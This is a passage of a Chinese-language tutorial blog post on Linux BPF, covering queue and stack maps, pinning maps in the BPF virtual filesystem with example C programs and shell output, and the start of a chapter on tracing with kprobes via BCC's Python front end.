如果尝试使用它们，它们将失败并将<code>errno</code>变量设置为<code>EINVAL</code>。</p><p>关于这些类型的映射，需要记住的是它们不使用映射键进行查找，并且在初始化这些映射时键大小必须始终为 0。 当你将元素推送到这些映射时，键必须是空值。</p><p>接下来看一个如何使用这类映射的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> queue_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_QUEUE,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们在这个映射中插入几个元素，并按照我们插入的顺序检索它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;queue_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;queue_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '0'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '4'</span><br></pre></td></tr></table></figure><p>如果我们再尝试从映射中弹出一个新元素，<code>bpf_map_lookup_and_delete</code>将返回一个负数，并且<code>errno</code>变量将设置为<code>ENOENT</code>。</p><h4 id="Stack映射"><a href="#Stack映射" class="headerlink" title="Stack映射"></a>Stack映射</h4><p>堆栈映射使用先进后出 (FILO)存储将元素保留在映射中。 它们使用<code>BPF_MAP_TYPE_STACK</code>类型定义。 FILO意味着当你从映射中获取元素时，结果将是最近添加到映射中的元素。</p><p>对于这种数据结构，bpf映射助手也以可预测的方式工作。当你使用<code>bpf_map_lookup_elem</code>时，此映射总是寻找最新的元素。当你使用<code>bpf_map_update_elem</code>时，此映射始终将元素附加到堆栈顶部，因此它是第一个获取的元素。你还可以使用帮助程序<code>bpf_map_lookup_and_delete</code>获取最新元素并以原子方式将其从映射中删除。此映射不支持帮助函数<code>bpf_map_delete_elem</code>和<code>bpf_map_get_next_key</code>。 如果你尝试使用它们，它们将始终失败并将 <code>errno</code>变量设置为<code>EINVAL</code>。</p><p>接下来看一个如何使用这类映射的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> stack_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_STACK,</span><br><span class="line">.key_size = <span class="number">0</span>,</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">  .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们在这个映射中插入几个元素，并按照我们插入的顺序检索它们：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">  bpf_map_update_elem(&amp;stack_map, <span class="literal">NULL</span>, &amp;i, BPF_ANY);</span><br><span class="line"><span class="keyword">int</span> value; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  bpf_map_lookup_and_delete(&amp;stack_map, <span class="literal">NULL</span>, &amp;value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Value read from the map: '4'</span><br><span class="line">Value read from the map: '3'</span><br><span class="line">Value read from the map: '2'</span><br><span class="line">Value read from the map: '1'</span><br><span class="line">Value read from the map: '0'</span><br></pre></td></tr></table></figure><p>如果我们再尝试从映射中弹出一个新元素，<code>bpf_map_lookup_and_delete</code>将返回一个负数，并且<code>errno</code>变量将设置为<code>ENOENT</code>。</p><p>正如我们前面提到的，BPF映射作为常规文件存储在你的操作系统中。但是我们还没有讨论内核用来保存映射和程序的文件系统的具体特征。下一部分将介绍BPF文件系统，以及可以从中获得的持久性类型。</p><h3 id="BPF虚拟文件系统"><a href="#BPF虚拟文件系统" class="headerlink" title="BPF虚拟文件系统"></a>BPF虚拟文件系统</h3><p>BPF映射的一个基本特征是基于文件描述符，这意味着当一个描述符关闭时，映射和它所保存的所有信息都会消失。BPF映射的最初实现专注于时间短且隔离的程序，它们之间不共享任何信息。在这些情况下，当文件描述符关闭时擦除所有数据很有意义。然而，随着内核中引入更复杂的映射和集成，其开发人员意识到他们需要一种方法来保存映射所持有的信息，即使在程序终止并关闭映射的文件描述符之后也是如此。Linux内核<code>4.4</code>版引入了两个新的系统调用，允许从虚拟文件系统固定和获取映射和BPF程序。 固定到该文件系统的Map和BPF程序将在创建它们的程序终止后保留在内存中。 在本节中，我们将解释如何使用这个虚拟文件系统。</p><p>BPF虚拟文件系统的默认目录是<code>/sys/fs/bpf</code>，一些Linux发行版默认不挂载这个文件系统，因为它们假设内核不支持BPF。你可以使用<code>mount</code>命令自行挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t bpf /sys/fs/bpf /sys/fs/bpf</span><br></pre></td></tr></table></figure><p>与其他文件层次结构一样，文件系统中的BPF持久化对象由路径标识。你可以以任何方式组织这些路径使得程序有意义。例如，如果你想在程序之间共享带有IP信息的特定映射，你可以将其存储在<code>/sys/fs/bpf/shared/ips</code>中。正如我们前面提到的，有两种类型的对象可以保存在这个文件系统中：BPF映射和完整的BPF程序。这两者都由文件描述符标识，因此使用它们的接口是相同的。 这些对象只能由bpf系统调用操作。 尽管内核提供了高级助手来帮助你与它们交互，但是不能做诸如尝试使用<code>open</code>系统调用打开这些文件之类的操作。</p><p><code>BPF_PIN_FD</code>是在这个文件系统中保存BPF对象的命令。当命令成功时，该对象将在你指定的路径中的文件系统中可见。如果命令失败，则返回一个负数，并使用错误代码设置全局<code>errno</code>变量。</p><p><code>BPF_OBJ_GET</code>是获取已固定到文件系统的BPF对象的命令。 此命令使用你分配的对象路径来加载它。 当此命令成功时，它会返回与对象关联的文件描述符标识符。 如果失败，则返回一个负数，并使用特定的错误代码设置全局errno变量。</p><p>让我们看一个例子，说明如何使用内核提供的辅助函数在不同的程序中利用这两个命令。首先，我们要编写一个程序来创建一个映射，用几个元素填充它，并将它保存在文件系统中：</p><p><code>map_pinning_save.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key, value, fd, added, pinned;</span><br><span class="line"></span><br><span class="line">  fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to create map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">  added = bpf_map_update_elem(fd, &amp;key, &amp;value, BPF_ANY);</span><br><span class="line">  <span class="keyword">if</span> (added &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to update map: %d (%s)\n"</span>, added, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pinned = bpf_obj_pin(fd, file_path);</span><br><span class="line">  <span class="keyword">if</span> (pinned &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pin map to the file system: %d (%s)\n"</span>, pinned,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们创建一个固定大小元素的哈希表映射。 然后我们更新映射以仅添加该元素。 如果我们尝试添加更多元素，<code>bpf_map_update_elem</code>将会失败，因为映射会溢出。</p><p>我们使用辅助函数<code>bpf_obj_pin</code>将映射保存在文件系统中。 </p><p><code>Makefile</code>程序如下</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CLANG = clang</span><br><span class="line"></span><br><span class="line">INCLUDE_PATH += -I/root/linux-5.4/tools/lib/bpf</span><br><span class="line"></span><br><span class="line">LIBRARY_PATH = -L/usr/local/lib64</span><br><span class="line">BPFSO = -lbpf</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: clean </span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f fetch save</span><br><span class="line"></span><br><span class="line"><span class="section">fetch: map_pinning_fetch.c </span></span><br><span class="line">clang -o fetch -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">save: map_pinning_save.c</span></span><br><span class="line">clang -o save -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">build: fetch save</span></span><br><span class="line"></span><br><span class="line">.DEFAULT_GOAL := build</span><br></pre></td></tr></table></figure><p>执行程序前查看<code>/sys/fs/bpf</code>路径下的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br></pre></td></tr></table></figure><p>开始执行该程序</p><p>第一步执行<code>make save</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make save</span><br><span class="line">clang -o save -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_save.c</span><br></pre></td></tr></table></figure><p>第二步执行生成的可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ./save</span><br></pre></td></tr></table></figure><p>在程序执行结束后，再次检查该路径下是否有一个新文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 25 16:15 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br><span class="line">-rw------- 1 root root 0 May 25 16:15 my_array</span><br></pre></td></tr></table></figure><p>接着我们可以编写一个类似的程序，从文件系统加载该映射并打印我们插入的元素。 这样我们就可以验证是否正确保存了映射：</p><p><code>map_pinning_fetch.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd, key, value, result;</span><br><span class="line"></span><br><span class="line">  fd = bpf_obj_get(file_path);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to fetch the map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>;</span><br><span class="line">  result = bpf_map_lookup_elem(fd, &amp;key, &amp;value);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并执行，结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make fetch</span><br><span class="line">clang -o fetch -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_fetch.c</span><br><span class="line">[root@VM-16-14-centos cpt2]# ./fetch </span><br><span class="line">Value read from the map: '1234'</span><br></pre></td></tr></table></figure><p>将BPF对象保存在文件系统中使得数据和程序不再依赖于单个执行线程。信息可以由不同的应用程序共享，BPF程序甚至可以在创建它们的应用程序终止后运行。这为它们提供了额外的级别或可用性，如果没有BPF文件系统，完成这些操作是不可能的。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>在内核和用户空间之间建立通信通道是充分利用BPF程序的基础。 在本章中，我们学习了如何创建BPF映射来建立这种通信以及如何使用它们。我们还描述了可以在程序中使用的映射类型。 接着我们学习到了更具体的映射示例。最后我们学习了如何将整个映射固定到系统中，以使得它们所保存的信息能够经受住崩溃和中断的影响。</p><p>BPF映射是内核和用户空间之间通信的中心总线。在本章中，我们建立了理解它们所需的基本概念。在下一章中，我们将更广泛地使用这些数据结构来共享数据。我们还会介绍一些其他工具，这些工具将使BPF映射的使用更加高效。</p><p>在下一章中将看到BPF程序和映射如何协同工作，从内核的角度为你提供系统上的跟踪功能。 我们探索了将程序附加到内核中不同入口点的不同方法。最后，我们将介绍如何以一种使应用程序更易于调试和观察的方式表示多个数据点。</p><h2 id="第四章节"><a href="#第四章节" class="headerlink" title="第四章节"></a>第四章节</h2><h3 id="使用-BPF-进行跟踪"><a href="#使用-BPF-进行跟踪" class="headerlink" title="使用 BPF 进行跟踪"></a>使用 BPF 进行跟踪</h3><p>在软件工程领域，跟踪是一种通过收集数据进行分析和调试的方法。目标是在运行时提供有用的信息以供将来分析。使用BPF进行跟踪的主要优点是可以访问来自Linux内核和应用程序的任何信息。与其他跟踪技术相比，BPF减少了系统性能和延迟，并且不需要开发人员为了从应用程序收集数据而修改他们的应用程序。</p><p>Linux内核提供了多种可与BPF结合使用的检测功能。在本章我们将讨论这些不同的功能。我们将展示内核如何在操作系统中暴露这些功能，以便你知道如何找到可用于BPF程序的信息。</p><p>跟踪的最终目标是通过获取所有可用数据并以有用的方式呈现，从而让你更加深入的了解系统。 我们将讨论几种不同的数据表示以及如何在不同的场景中使用它们。</p><p>从本章开始，我们将使用一种强大的工具包来编写BPF程序，BPF编译收集器(BCC)。BCC 是一组使构建BPF程序更可预测的组件。即使你掌握了<code>Clang</code>和<code>LLVM</code>，你也不想花费不必要的时间来构建相同的实用程序，除此之外还要确保BPF验证器不会拒绝你编写的程序。BCC为常见结构（如<code>Perf</code>事件映射）提供可重用组件，并与<code>LLVM</code>后端集成以提供更好的调试选项。最重要的是，BCC包括多种编程语言的绑定， 我们将在示例中使用<code>Python</code>。 这些绑定允许你用高级语言编写BPF程序的用户空间部分，从而产生更有用的程序。我们还在后面的章节中使用BCC来使示例代码更加简洁。</p><p>BCC工具安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install bcc-tools</span><br></pre></td></tr></table></figure><p>BCC工具安装在<code>/usr/share/bcc/tools/</code>目录中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ll /usr/share/bcc/tools/</span><br><span class="line">total 1012</span><br><span class="line">-rwxr-xr-x 1 root root 34678 Jul 16  2021 argdist</span><br><span class="line">-rwxr-xr-x 1 root root  2413 Jul 16  2021 bashreadline</span><br><span class="line">-rwxr-xr-x 1 root root 16209 Jul 16  2021 bindsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6774 Jul 16  2021 biolatency</span><br><span class="line">-rwxr-xr-x 1 root root  9979 Jul 16  2021 biolatpcts</span><br><span class="line">-rwxr-xr-x 1 root root  5776 Jul 16  2021 biosnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6687 Jul 16  2021 biotop</span><br><span class="line">-rwxr-xr-x 1 root root  1170 Jul 16  2021 bitesize</span><br><span class="line">-rwxr-xr-x 1 root root  2612 Jul 16  2021 bpflist</span><br><span class="line">-rwxr-xr-x 1 root root  4728 Jul 16  2021 cachestat</span><br><span class="line">-rwxr-xr-x 1 root root  7312 Jul 16  2021 cachetop</span><br><span class="line">-rwxr-xr-x 1 root root  8436 Jul 16  2021 capable</span><br><span class="line">-rwxr-xr-x 1 root root    57 Jul 16  2021 cobjnew</span><br><span class="line">-rwxr-xr-x 1 root root 11181 Jul 16  2021 compactsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  5272 Jul 16  2021 cpudist</span><br><span class="line">-rwxr-xr-x 1 root root 14608 Jul 16  2021 cpuunclaimed</span><br><span class="line">-rwxr-xr-x 1 root root  7402 Jul 16  2021 dbslower</span><br><span class="line">-rwxr-xr-x 1 root root  3794 Jul 16  2021 dbstat</span><br><span class="line">-rwxr-xr-x 1 root root  3963 Jul 16  2021 dcsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  3931 Jul 16  2021 dcstat</span><br><span class="line">-rwxr-xr-x 1 root root 19972 Jul 16  2021 deadlock</span><br></pre></td></tr></table></figure><p>能够在Linux内核中跟踪程序的第一步是确定它为你提供的附加BPF程序的扩展点。这些扩展点通常称为探针(probes)。</p><h4 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h4><p>英语词典中对探针一词的定义之一如下：</p><p>一种无人探索航天器，旨在传输有关其环境的信息。</p><p>这个定义在我们脑海中唤起了对科幻电影和史诗般的NASA任务的回忆。 当我们谈论跟踪探针时，我们可以使用非常相似的定义。</p><p>跟踪探针是探索性程序，旨在传输有关执行它们的环境的信息。</p><p>他们在你的系统中收集数据，供你探索和分析。传统上，在Linux中使用探针涉及编写编译到内核模块中的程序，这可能会导致生产系统中的灾难性问题。多年来，它们发展到执行起来很安全，但编写和测试仍然很麻烦。像<code>SystemTap</code>这样的工具建立了新的协议来编写探针。</p><p>BPF搭载跟踪探测来收集信息以进行调试和分析。BPF程序的安全性使得它们比依赖重新编译内核的工具更有吸引力。重新编译内核以包含外部模块可能会引起由于代码行为不当而导致崩溃的风险。BPF验证器通过在加载到内核之前分析程序来消除这种风险。BPF开发人员利用探针定义并修改内核，从而当代码执行找到其中一个定义时执行的是BPF程序而不是内核模块。</p><p>了解可以定义的不同类型的探针对于探索系统中发生的事情至关重要。在本节中，我们对不同的探针定义进行分类，如何在系统中发现它们，以及如何将BPF程序附着到它们。</p><p>在本章中，我们介绍了四种不同类型的探针：</p><ul><li><p>Kernel probes</p><p>这些使您可以动态访问内核中的内部组件</p></li><li><p>Tracepoints</p><p>这些提供对内核内部组件的静态访问</p></li><li><p>User-space probes</p><p>这些使您可以动态访问在用户空间中运行的程序</p></li><li><p>User statically defined tracepoints</p><p>这些允许静态访问在用户空间中运行的程序</p></li></ul><p>接下来让我们从内核探针开始详细的学习</p><h3 id="Kernel-probes"><a href="#Kernel-probes" class="headerlink" title="Kernel probes"></a>Kernel probes</h3><p>内核探针允许你在几乎任何内核指令中以最小的开销设置动态标志或中断。当内核到达这些标志之一时，它会执行附加到探针的代码，然后恢复其正常例程。内核探针可以为你提供有关系统中发生的任何事情的信息，例如系统中打开的文件和正在执行的二进制文件。关于内核探针需要记住的重要一点是它们没有稳定的应用程序二进制接口 (ABI)，这意味着它们可能会在内核版本之间发生变化。如果你尝试将相同的探测器附加到具有两个不同内核版本的两个系统，则相同的代码可能会停止工作。</p><p>内核探针分为两类：<code>kprobes</code>和<code>kretprobes</code>。 它们的使用取决于你在执行周期中插入BPF程序的位置。 本节将指导你如何使用它们中的每一个将BPF程序附加到这些探针并从内核中提取信息。</p><h4 id="Kprobes"><a href="#Kprobes" class="headerlink" title="Kprobes"></a>Kprobes</h4><p><code>Kprobes</code>允许你在执行任何内核指令之前插入BPF程序。你需要知道你想要破解的函数签名，正如我们之前提到的，这不是一个稳定的ABI，所以如果你要运行相同的程序，你需要在不同的内核版本中小心设置这些探针。 当内核执行到达你设置探针的指令时，它会避开你的代码，运行你的BPF程序，并将执行返回到原始指令。</p><p>为了展示如何使用<code>kprobes</code>，我们将编写一个BPF程序，该程序打印系统中执行的任何二进制文件的名称。在本例中，我们将为BCC工具使用Python前端，但你可以使用任何其他BPF工具编写它：</p><p><code>kprobes.py</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""1</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("executing program: %s\\n", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.attach_kprobe(event=execve_function, fn_name=<span class="string">"do_sys_execve"</span>)</span><br><span class="line">bpf.trace_print()<span 